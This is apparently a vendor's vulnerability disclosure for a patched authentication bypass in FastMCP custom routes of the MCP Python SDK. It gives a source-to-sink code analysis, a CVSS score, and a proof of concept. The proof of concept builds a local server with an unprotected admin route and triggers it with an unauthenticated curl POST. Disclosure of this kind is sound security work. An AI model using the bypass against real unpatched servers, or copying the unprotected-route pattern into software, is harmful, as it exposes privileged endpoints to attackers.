---
schema_version: "1.0.0"
document_id: "dc23537f9a33c585db11551a8d119c25b21151f7db9069be154979bc37c1e09a"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/anthropic-fastmcp-auth-bypass"
published_at: "2025-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:58:25.712310+00:00"
content_hash: "sha256:85add2823a30010d32dcd380a37b83fba1cc53d4d72f49ff41012189a0de2c23"
---

# Authentication bypass on FastMCP custom routes

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Anthropic


Critical


2025


# Authentication bypass on FastMCP custom routes


## Summary


Broken Access Control in FastMCP custom routes


` FastMCP.custom_route()` allows developers to mount arbitrary HTTP handlers intended for sensitive use cases such as OAuth callbacks or admin APIs, but it never applies` RequireAuthMiddleware` even when the server is configured with a token verifier. Only the built-in SSE and StreamableHTTP endpoints are wrapped; custom routes are appended to the Starlette app as-is while Starlette’s` AuthenticationMiddleware` merely records credentials without rejecting unauthenticated requests. As a result any HTTP endpoint registered through` @server.custom_route()` remains publicly accessible despite OAuth or token-based authentication being enabled for the server. Attackers can directly invoke privileged administration handlers over the network without presenting credentials.


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


L


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L


### Vulnerability Location


Source


Line 685


src /mcp


/server


/fastmcp


/server.py


FastMCP.custom_route


Sink


Line 920


src /mcp


/server


/fastmcp


/server.py


FastMCP.sse_app


## Source-to-Sink Analysis


1


src/mcp/server/fastmcp/server.py:921


Custom Starlette routes registered via custom_route() are appended to the SSE app without additional middleware.


PYTHON


```text
routes.extend( self  ._custom_starlette_routes)


```


2


src/mcp/server/fastmcp/server.py:716


custom_route() stores the developer handler as-is with no authentication enforcement even though docstring suggests admin usage.


PYTHON


```text
self  ._custom_starlette_routes.append(Route(path, endpoint=func,...))


```


3


src/mcp/server/fastmcp/server.py:953


Even when auth is enabled only AuthenticationMiddleware is added globally; it does not reject unauthenticated requests, so custom routes remain open.


PYTHON


```text
if    self  ._token_verifier:
middleware = [Middleware(AuthenticationMiddleware, backend=BearerAuthBackend(...)), Middleware(AuthContextMiddleware)]


```


4


examples/servers/simple-auth/mcp_simple_auth/legacy_as_server.py:84


Attacker-controlled HTTP request reaches privileged handler without proving identity, enabling arbitrary admin operations.


PYTHON


```text
request =  await   func(request)


```


## Impact Analysis


### Critical Impact


Whatever privileged operations the route performs (e.g., issuing OAuth tokens, modifying server state) happen with attacker input. Confidentiality, integrity, and availability of the server are compromised.


### Attack Surface


Any MCP deployment that calls` FastMCP(..., token_verifier=..., auth=AuthSettings(...))` and registers routes via` @server.custom_route()` .


### Preconditions


None; attacker only needs network access. Authentication is enabled but not enforced on custom routes.


## Proof of Concept


### Environment Setup


Requirements: Ubuntu 22.04+, Python 3.10+,` uv` package manager.


Install dependencies:


BASH


```text
git  clone   https://github.com/modelcontextprotocol/python-sdk.git
cd   python-sdk
uv  sync   --frozen


```


### Target Configuration


Create a minimal FastMCP server that enables OAuth-style auth but exposes an admin route:


PYTHON


```text
from   mcp.server.fastmcp  import   FastMCP
from   mcp.server.auth.settings  import   AuthSettings
from   mcp.server.auth.provider  import   AccessToken, TokenVerifier
from   starlette.requests  import   Request
from   starlette.responses  import   JSONResponse


class    StaticVerifier  ( TokenVerifier  ):
async    def    verify_token  ( self, token:  str   ):
return   AccessToken(token=token, client_id= "admin"  , scopes=[ "admin"  ])  if   token ==  "valid"    else    None


app = FastMCP(
token_verifier=StaticVerifier(),
auth=AuthSettings(
issuer_url= "https://auth.example.com"  ,
resource_server_url= "https://server.example.com"  ,
required_scopes=[ "admin"  ],
),
)


@app.custom_route( "/admin/restart"  , methods=[ "POST"  ]  )
async    def    restart  ( _: Request  ):
return   JSONResponse({ "status"  :  "restarted"  })


if   __name__ ==  "__main__"  :
app.run(transport= "streamable-http"  )


```


Run the vulnerable server:


BASH


```text
uv run python vulnerable_server.py
# Server listens on http://127.0.0.1:8000/mcp


```


### Exploit Delivery


Unauthenticated attack:


BASH


```text
curl -X POST http://127.0.0.1:8000/admin/restart


```


### Outcome


An Internet attacker can trigger any custom admin route without valid tokens (resetting state, altering configuration, dumping data, etc.), fully bypassing the configured OAuth/token protections.


**Expected Response:**


JSON


```text
{  "status"  :  "restarted"  }


```


No` Authorization` header is required even though the server advertises admin scope enforcement.


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/modelcontextprotocol/python-sdk/pull/1660)
